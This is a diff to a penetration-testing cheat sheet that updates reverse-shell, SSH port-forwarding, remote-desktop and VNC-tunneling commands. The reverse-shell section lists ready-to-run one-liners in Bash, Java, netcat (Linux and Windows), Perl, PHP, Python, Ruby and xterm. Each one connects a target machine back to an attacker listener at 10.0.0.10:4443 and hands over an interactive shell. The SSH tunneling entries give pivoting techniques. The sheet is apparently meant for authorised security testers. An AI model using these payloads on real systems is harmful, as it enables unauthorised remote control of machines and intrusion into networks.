@@ -173,41 +173,49 @@ iptables -P FORWARD ACCEPT
 sysctl net.ipv4.ip_forward=1
 ------------------------------------------------------------------------------------------------------
 
+# Remote Desktop
+
+rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.0.0.10
+------------------------------------------------------------------------------------------------------
+
 # Reverse shells
 
-- nc -lvp 4444			Setup a listen on the attack box.
+- Set local listener
+nc -lvp 4443			          Setup a listen on the attack box.
 
-- Bash
-bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+- Bash shell
+bash -i >& /dev/tcp/10.0.0.10/4443 0>&1
 
 - Java
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.10/4443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 
-- Netcat
-nc -c /bin/sh 10.0.0.1 4444
+- Netcat Linux
+nc -e /bin/sh 10.0.0.10 4443
 
-/bin/sh | nc 10.0.0.1 4444
+- Netcat Windows
+nc -e cmd.exe 10.0.0.10 4443
 
-rm -f /tmp/p; mknod /tmp/p p && nc 10.0.0.1 4444 0/tmp/p
+- Netcat without -e flag
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.10 4443 > /tmp/f
 
 - Perl
-perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="10.0.0.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 - PHP
-php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.10",4443);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 - Python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 - Ruby
-ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",4443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 - xterm
-xterm -display 10.0.0.1:1		target - It will connect back to you on TCP port 6001.
-Xnest :1				attacker - catch the incoming xterm, start an X-Server.
-xhost +targetip				attacker - Authorise the target to connect to you.
+xterm -display 10.0.0.10:1		target - It will connect back to you on TCP port 6001.
+Xnest :1				          attacker - catch the incoming xterm, start an X-Server.
+xhost +targetIP				attacker - Authorise the target to connect to you.
 ------------------------------------------------------------------------------------------------------
 
 # Searching
@@ -234,13 +242,20 @@ ssh-keygen                         Generate new public/private key pair
 ssh user@targetIP                  Connect on a standard port
 ssh user@targetIP -p 2222          Connect on a non-standard port
 ssh user@targetIP -i file.pem      Connect and authenticate using an identity file
-ssh user@targetIP -L 5900:localhost:5900     Connect and use local port forwarding
 
-ssh user@targetIP -D 1080 -f -N    -D  Create a SOCKS tunnel on the default port
+- Local port forward
+ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
+ssh user@targetIP -L 5900:localhost:5900
+
+- Remote port forward
+ssh <gateway> -R <remote port to bind>:<local host>:<local port>
+ssh user@targetIP -R 2222:localhost:22 -f -N
                                    -f  Force to background
                                    -N  Do not execute a remote command
 
-ssh user@targetIP -R 2222:localhost:22 -f -N
+- Dynamic port forward
+ssh -D <local proxy port> -p <remote port> <target>
+ssh user@targetIP -D 1080 -f -N    -D  Create a SOCKS tunnel on the default port
 
 Firefox Preferences > Advanced > Network > Settings > Manual proxy configuration
 Remove everything for HTTP, SSL, and FTP proxies and ports
@@ -323,7 +338,7 @@ tcpdump -w out.pcap -s 65535  'udp port 53'
 
 # Tunneling VNC over SSH
 
-OS X (awsv)                        ssh -L 5901:localhost:5901 -i ~/.ssh/lee-ec2.pem ec2-user@52.x.x.x
+OS X (awsv)                        ssh -L 5901:localhost:5901 -i ~/.ssh/aws.pem ec2-user@<atter IP>
 
 Remote Kali                        sudo -i
                                    vncserver -geometry 1440x850
